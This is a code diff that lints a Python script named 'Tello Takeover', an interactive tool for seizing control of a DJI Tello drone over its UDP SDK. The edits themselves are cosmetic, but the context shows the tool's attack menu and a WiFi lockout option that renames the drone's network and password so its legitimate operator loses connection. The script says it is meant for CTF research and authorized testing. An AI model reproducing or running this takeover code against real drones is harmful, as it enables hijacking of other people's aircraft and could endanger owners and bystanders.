@@ -36,13 +36,10 @@ Dependencies: None (stdlib only)
 For CTF research and authorized security testing only.
 """
 
+import argparse
 import socket
 import sys
-import argparse
 import time
-import threading
-import select
-
 
 # Default Tello endpoint
 TELLO_IP = "192.168.10.1"
@@ -133,7 +130,7 @@ class TelloController:
         response = self.send_command("command")
 
         if response and "ok" in response.lower():
-            print(f"[+] SDK mode activated. Tello is under our control.", file=sys.stderr)
+            print("[+] SDK mode activated. Tello is under our control.", file=sys.stderr)
             self.connected = True
             return True
         elif response:
@@ -141,7 +138,7 @@ class TelloController:
             self.connected = True  # Try anyway
             return True
         else:
-            print(f"[!] No response from Tello. Ensure you're connected to TELLO-XXXXXX WiFi.", file=sys.stderr)
+            print("[!] No response from Tello. Ensure you're connected to TELLO-XXXXXX WiFi.", file=sys.stderr)
             return False
 
     def send_command(self, cmd):
@@ -158,24 +155,24 @@ class TelloController:
             response = data.decode('utf-8', errors='replace').strip()
             print(f"  [RX] {response}", file=sys.stderr)
             return response
-        except socket.timeout:
-            print(f"  [RX] (timeout — no response)", file=sys.stderr)
+        except TimeoutError:
+            print("  [RX] (timeout — no response)", file=sys.stderr)
             return None
 
     def run_interactive(self):
         """Interactive command loop."""
         print(f"\n{'=' * 60}", file=sys.stderr)
-        print(f"  Tello Takeover — Interactive Mode", file=sys.stderr)
+        print("  Tello Takeover — Interactive Mode", file=sys.stderr)
         print(f"  Target: {self.tello_addr[0]}:{self.tello_addr[1]}", file=sys.stderr)
         print(f"{'=' * 60}", file=sys.stderr)
 
-        print(f"\n  Quick attacks:", file=sys.stderr)
+        print("\n  Quick attacks:", file=sys.stderr)
         for key, (desc, _) in ATTACK_PRESETS.items():
             print(f"    {key}. {desc}", file=sys.stderr)
 
-        print(f"\n  Or type any SDK command directly.", file=sys.stderr)
-        print(f"  Type 'help' for all commands, 'quit' to exit.", file=sys.stderr)
-        print(f"", file=sys.stderr)
+        print("\n  Or type any SDK command directly.", file=sys.stderr)
+        print("  Type 'help' for all commands, 'quit' to exit.", file=sys.stderr)
+        print("", file=sys.stderr)
 
         while True:
             try:
@@ -201,8 +198,8 @@ class TelloController:
 
                 if cmd == "6":
                     # WiFi lockout — needs confirmation
-                    print(f"  This changes the Tello's WiFi SSID and password.", file=sys.stderr)
-                    print(f"  The legitimate operator will lose connection.", file=sys.stderr)
+                    print("  This changes the Tello's WiFi SSID and password.", file=sys.stderr)
+                    print("  The legitimate operator will lose connection.", file=sys.stderr)
                     try:
                         confirm = input("  New SSID (or 'cancel'): ").strip()
                     except (EOFError, KeyboardInterrupt):
@@ -247,7 +244,7 @@ class TelloController:
 
     def _print_help(self):
         """Print all available commands."""
-        print(f"\n  Tello SDK Commands:", file=sys.stderr)
+        print("\n  Tello SDK Commands:", file=sys.stderr)
         for category, cmds in SDK_COMMANDS.items():
             print(f"\n  [{category}]", file=sys.stderr)
             for cmd, desc in cmds.items():
